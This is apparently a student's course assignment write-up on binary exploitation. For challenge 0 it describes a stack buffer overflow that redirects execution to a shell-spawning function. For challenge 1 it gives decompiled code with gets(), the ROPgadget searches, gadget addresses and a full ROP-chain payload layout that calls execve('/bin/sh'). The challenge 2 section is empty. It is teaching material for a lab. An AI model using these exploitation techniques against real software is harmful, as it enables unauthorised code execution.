# assignment 5

Luigi Cussigh
2023148006

## challege 0

i generated characters to pad the stack frame with 'A's till we get to the return address. then i appended characters
that overwrite the return address with \x50\x11\x40\x00\x00\x00\x00\x00\x0a which is the address of a function that calls
execve("/bin/sh", NULL, NULL)

## challenge 1

the decompiled code of the vulnerable function looks something like:

__int64 sub_401510()
{
  int v0; // ebx
  char nptr[272]; // [rsp+8h] [rbp-110h] BYREF

  puts("Enter id:");
  gets(nptr);
  v0 = strtol(nptr, 0, 10);
  puts("Enter password:");
  return gets(&nptr[16 * v0 + 8]);
}

also, there's a null terminated string "/bin/sh" at address 0x402004:

``` plaintext
Contents of section .rodata:
 402000 01000200 2f62696e 2f736800 25730025  ..../bin/sh.%s.%
 402010 700a005b 52455355 4c545d20 4e6f7420  p..[RESULT] Not 
 402020 6578706c 6f697465 64203a28 20457869  exploited :( Exi
 402030 74696e67 20736166 656c792e 0a00456e  ting safely...En
 402040 74657220 69643a00 456e7465 72207061  ter id:.Enter pa
 402050 7373776f 72643a00                    ssword:.        
```

using ROPgadget we find a syscall gadget:

ROPgadget --binary ./exploitme | grep syscall

0x000000000040134c : syscall

also we need to set rdi, rsi, rdx, rax using pop gadgets

ROPgadget --binary ./exploitme | grep pop (register)

rdi:
(no pop for rdi, we'll have to get creative..)

rsi:
0x00000000004015e9 : pop rsi ; ret

rdx:
0x00000000004012e8 : pop rdx ; ret

rax:
(no pop for rax, we'll have to get creative..)

since we dont have rdi and rax pops (the most important ones...) we'll have to substitute:

ROPgadget --binary ./exploitme | grep "mov rdi"

rdi: // compound_gadget_0
0x0000000000401363 : mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall

rax:
0x0000000000401230 : mov rax, rsi ; ret

we can run:

pop rsi // store 59 (0x3b) on higher address
mov rax, rsi; ret
pop rsi // store pointer to /bin/sh on higher address
mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall // the xor's set the registers to 0 which is we want to do anyway

{} - ranges of random bytes
() - words that need to be reversed byte by byte

we'll just pass the first function:
"0A"{272 - 2 bytes of random stuff}(00000000004015e9)(000000000000003b)(0000000000401230)(00000000004015e9)(0000000000402004)(0000000000401363)'\n'
  |        |                                           |                                                     |
  |        compensate for "0A"                         value of rax                                          address to "/bin/sh"
  to escape strtol

## challenge 2

